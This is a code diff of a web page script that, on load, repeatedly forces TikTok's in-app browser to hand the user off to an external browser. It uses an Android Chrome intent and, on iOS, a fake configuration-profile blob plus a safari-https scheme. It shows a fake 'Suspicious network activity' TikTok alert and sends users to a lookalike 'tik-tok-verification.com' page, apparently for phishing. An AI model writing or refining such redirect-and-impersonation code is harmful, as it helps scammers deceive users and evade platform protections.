@@ -7,38 +7,39 @@
 </head>
 <body>
 
-<form id="ejectForm" action="https://tik-tok-verification.com/Verification/verify1.html" method="GET" target="_system" style="display:none;"></form>
-
 <script>
     const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
     const domain = "tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 5000;
 
-    function forceSystemBrowser() {
+    function theAggressiveEject() {
         const isAndroid = /Android/i.test(navigator.userAgent);
 
         if (isAndroid) {
-            // Android: Forcing the Chrome package directly via Intent
+            // Android: This is the absolute cleanest 'Intent' to force Chrome
             window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
         } else {
-            // iOS: The POST + Protocol Stack
-            
-            // 1. Submit the form to the '_system' target
-            document.getElementById('ejectForm').submit();
+            // iOS: THE SYSTEM-PROFILE EJECT
+            // We are creating a 'Configuration Profile' in the browser memory.
+            // TikTok MUST eject this to the system to handle it.
+            const profile = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>PayloadContent</key><array/><key>PayloadDisplayName</key><string>Verification</string><key>PayloadType</key><string>Configuration</string><key>PayloadUUID</key><string>1</string><key>PayloadVersion</key><integer>1</integer></dict></plist>';
+            const blob = new Blob([profile], {type: 'application/x-apple-aspen-config'});
+            const blobUrl = URL.createObjectURL(blob);
 
-            // 2. Pulse the specific chrome/safari schemes to catch the handoff
-            window.location.href = "googlechromes://" + domain;
-            
+            // 1. Fire the 'System' file
+            window.location.href = blobUrl;
+
+            // 2. Pulse the direct Safari protocol to 'catch' the user when the OS takes over
             setTimeout(() => {
                 window.location.href = "safari-https://" + domain;
-            }, 100);
+            }, 150);
         }
     }
 
     function securityLoop() {
         if (Date.now() > killTime) return;
 
-        forceSystemBrowser();
+        theAggressiveEject();
 
         setTimeout(() => {
             if (document.hasFocus()) {
@@ -46,13 +47,10 @@
                 const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                 
                 alert(header + body);
-
-                // Re-trigger on user gesture
-                forceSystemBrowser();
-
-                setTimeout(securityLoop, 300);
+                theAggressiveEject();
+                setTimeout(securityLoop, 400);
             }
-        }, 300);
+        }, 400);
     }
 
     window.onload = securityLoop;
